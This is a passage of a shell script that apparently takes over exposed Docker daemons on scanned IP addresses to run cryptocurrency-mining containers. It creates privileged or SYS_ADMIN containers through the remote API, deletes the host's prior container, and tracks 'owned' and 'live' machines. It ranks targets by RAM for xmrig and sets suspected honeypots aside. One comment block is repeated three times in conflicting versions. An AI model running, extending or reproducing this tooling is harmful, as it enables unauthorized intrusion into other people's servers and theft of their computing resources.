    BODYSUP=$(supbody "$ARGSH" "$memlim" 0)
    BODYSUPP=$(supbody "$ARGSH" "$memlim" 1)
    BODYSUPN=$(supbody "$ARGSH" "$memlim" 0 1)
    PBN=$(pbody "$CMDH" "$memlim" 0 1)
    PBP=$(pbody "$CMDH" "$memlim" 1 0)
    PB=$(pbody "$CMDH" "$memlim" 0 0)

    # Rungs, most capable first, each strictly more boring than the last:
    #   1 supervisor + threads + mem cap + SYS_ADMIN/host-ipc   (what we want)
    #   2 same, but Privileged                                  (MSR/hugepages refused)
    #   3 no supervisor, same flags                             (no sh in the image)
    #   4 bare minimum body                                     (hardened daemon)
    # The host's old container is only deleted AFTER a rung is verified running.
    # Rungs, most capable first, each strictly more boring than the last:
    #   1 supervisor + threads + mem cap + SYS_ADMIN/host-ipc   (what we want)
    #   2 same, but host networking                            (dashboard/NAT broken)
    #   3 same, but Privileged                                  (MSR/hugepages refused)
    #   4 no supervisor, no published port                       (no sh in the image)
    #   5 bare minimum body                                     (hardened daemon)
    # The host's old container is stopped before this, and only deleted AFTER a rung is
    # verified running - so a failed re-create costs seconds, never the host.
    # Rungs, most capable first, each strictly more boring than the last:
    #   1 supervisor + threads + mem cap + HOST NETWORK                (measured: works)
    #   2 same but bridged with the port published                    (docker-proxy broken
    #     on some daemons: this is the rung that fails "failed to set up container
    #     networking" there, so it cannot be first)
    #   3 same, but Privileged                                        (MSR/hugepages refused)
    #   4 no supervisor, no published port                             (no sh in the image)
    #   5 bare minimum body                                           (hardened daemon)
    # The host's old container is stopped before this, and only deleted AFTER a rung is
    # verified running - so a failed re-create costs seconds, never the host.
    rung=0
    for cand in "$PBN" "$PBP" "$PB" "$BODYMIN" "$BODYSUPN" "$BODYSUP"; do
        rung=$((rung + 1))
        if ! r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
                    -H "Content-Type: application/json" -d "$cand" 2>/dev/null); then
            echo "dock: $ip create failed (rung $rung)"
            continue
        fi
        id=$(printf '%s' "$r" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
        cid=${id:-$name}
        # No -f here: docker answers a good start with 204 and an empty body, and a
        # refused one with a JSON error body - so the body IS the verdict.
        err=$(curl -sS $opts --max-time 25 -X POST "$b/containers/$cid/start" 2>/dev/null) || err="curl failed"
        if [ -z "$err" ]; then
            printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
            printf '%s\t%s\n' "$ip" "$NOW" >> "$LIVE"
            mockcheck "$ip" "$cid" "$name"
            if [ -n "${oldid:-}" ]; then
                curl -sS $opts --max-time 20 -X DELETE "$b/containers/$oldid?force=1" >/dev/null 2>&1 || :
                echo "dock: DEPLOYED $name -> $ip (rung $rung, threads=$th, replaced $oldid)"
            else
                echo "dock: DEPLOYED $name -> $ip (rung $rung, threads=$th, mem=$memlim)"
            fi
            oldid=""
            return 0
        fi
        # 404 bodies exit 0 without -f, so print the reason and try the next rung
        echo "dock: $ip rung $rung start said: $(printf '%s' "$err" | head -c 120)"
        curl -sS $opts --max-time 20 -X DELETE "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
    done
    echo "dock: $ip all $rung rungs failed"
    # Every rung failed - so the host is currently EMPTY. Put the old one back.
    if [ -n "${oldid:-}" ] && [ -n "${oldstop:-}" ]; then
        if curl -fsS $opts --max-time 20 -X POST "$b/containers/$oldid/start" >/dev/null 2>&1; then
            echo "dock: $ip re-create failed on every rung - OLD CONTAINER RESTARTED, host not empty"
        else
            echo "dock: $ip re-create failed and old restart failed - host may be empty now"
        fi
    fi
    oldid=""
}

queued=$(wc -l < "$HOSTS")
rearm_n=$(wc -l < "$REARM_LIST")
echo "dock: $queued candidates, re-arm $rearm_n, cap $MAX, parallel $PAR"
# Dedupe BEFORE counting: the end-of-run dedupe used to make the "+N new" delta
# negative, because owned_before had counted the duplicate rows.
sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
awk -F'\t' '!s[$1]++' "$OWNFILE" > "$OWNFILE.n" 2>/dev/null && mv -f "$OWNFILE.n" "$OWNFILE" || true
owned_before=$(wc -l < "$OWNFILE")

# Known hosts first (re-arm), then genuinely new candidates. Re-arm rows bypass
# dock.seen and the retry ledger on purpose - those two are what used to make a
# pruned host unreachable forever.
n=0
rcount=0
walk() {
    role=$1; lim=$2; nr=0
    echo "dock: pass $role, $(wc -l < "$LIST") row(s), cap $lim"
    while read -r ip; do
        [ -n "$ip" ] || continue
        if [ "$role" = fresh ]; then
            # if/then, NOT `grep ... && continue`: under `set -e` an AND-list whose
            # first command fails is a landmine, and this is where a whole 2375-row
            # candidate file silently turned into zero scans.
            if grep -qxF "$ip" "$SEEN" 2>/dev/null; then continue; fi
            if grep -qxF "$ip" "$REARM_LIST" 2>/dev/null; then continue; fi
            if awk -v now="$NOW" -v retry="$RETRY" -v ip="$ip" \
                    '$2 == ip && $1 > now - retry { f = 1 } END { exit !f }' "$TRIED"; then
                continue
            fi
        fi
        n=$((n + 1)); nr=$((nr + 1))
        if [ "$nr" -gt "$lim" ]; then echo "dock: $role cap $lim reached, rest stays queued"; return 0; fi
        dock_one "$ip" < /dev/null &
        # ^ /dev/null matters: a backgrounded dock_one otherwise inherits the
        #   walk's stdin (the candidate file) and eats lines out from under the
        #   `read`, so a 2290-row queue ended after 181 rows.
        if [ $((n % PAR)) -eq 0 ]; then wait || true; fi
    done < "$LIST"
}
LIST="$REARM_LIST"; walk rearm "$REARM_CAP"
LIST="$HOSTS";      walk fresh "$MAX"
fresh_scanned=$nr
wait || true
rm -f "$HOSTS" "$REARM_LIST"
sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
# Then dedupe by *IP*: every successful start appends a row, so the file was really
# a log of starts (94 rows for 53 real hosts) and "placed 57 (+-38 new)" was
# arithmetic on that. One row per endpoint keeps the numbers we steer by honest.
awk -F'\t' '!s[$1]++' "$OWNFILE" > "$OWNFILE.n" 2>/dev/null && mv -f "$OWNFILE.n" "$OWNFILE" || true

# Rotate the ledger: known daemons minus what we now hold, with the slice we just
# checked moved to the tail, so the next run re-checks the *others*. Without the
# rotation the same head would be retried forever and the tail never reached.
if [ "$REARM" = yes ]; then
    cut -f1 "$OWNFILE" 2>/dev/null | sort -u > "$WORK/own.$$" || :
    grep -vxF -f "$WORK/own.$$" "$SEEN" 2>/dev/null | sort -u > "$WORK/lg.$$" || :
    # Order the ledger big-host-first. A sub-1GB box cannot hold RandomX's 2GB dataset,
    # so xmrig drops to light mode and tops out ~100-200 H/s - the scarce re-check
    # budget belongs to machines that can actually produce. Unknown sizes sort last.
    if [ -s "$RAMFILE" ]; then
        sort -u "$RAMFILE" -o "$RAMFILE" 2>/dev/null || :
        awk -F'\t' 'NR==FNR { m[$1]=$2; next } { print (($1 in m) ? m[$1] : 0) "\t" $1 }' \
            "$RAMFILE" "$WORK/lg.$$" 2>/dev/null | sort -rn | cut -f2 > "$WORK/lg3.$$" &&
            mv -f "$WORK/lg3.$$" "$WORK/lg.$$" || :
    fi
    # Canned-API hosts never really run anything, so keep them at the very tail: the
    # re-check budget belongs to machines that can produce a share.
    if [ -s "$MOCKFILE" ]; then
        sort -u "$MOCKFILE" -o "$MOCKFILE" 2>/dev/null || :
        grep -vxF -f "$MOCKFILE" "$WORK/lg.$$" > "$WORK/lg4.$$" 2>/dev/null || :
        grep -xF -f "$MOCKFILE" "$WORK/lg.$$" >> "$WORK/lg4.$$" 2>/dev/null || :
        mv -f "$WORK/lg4.$$" "$WORK/lg.$$" 2>/dev/null || :
    fi
    tail -n +$((REARM_MAX + 1)) "$WORK/lg.$$" > "$WORK/lg2.$$" 2>/dev/null || :
    head -n "$REARM_MAX" "$WORK/lg.$$" >> "$WORK/lg2.$$" 2>/dev/null || :
    mv -f "$WORK/lg2.$$" "$LEDGER" 2>/dev/null || cp -f "$WORK/lg2.$$" "$LEDGER"
    rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$" "$WORK/lg3.$$" "$WORK/lg4.$$"
fi
owned_now=$(wc -l < "$OWNFILE")
live_now=$(awk -v t="$NOW" -F'\t' '$2 > t - 21600 { print $1 }' "$LIVE" 2>/dev/null | sort -u | wc -l)
echo "dock: scanned $n (fresh ${fresh_scanned:-0}), daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
# LIVE is the number that matters: owned is history (ever placed), live is "verified
# running ours in the last 6h". The audit found 59 owned / 4 live, so reporting only
# the first was actively misleading.
echo "dock: live $live_now (verified running within 6h), re-created this run $rcount (cap $RECREATE_MAX)"
echo "dock: re-arm ledger holds $(wc -l < "$LEDGER") known-but-lost host(s), mock-flagged $(wc -l < "$MOCKFILE")"

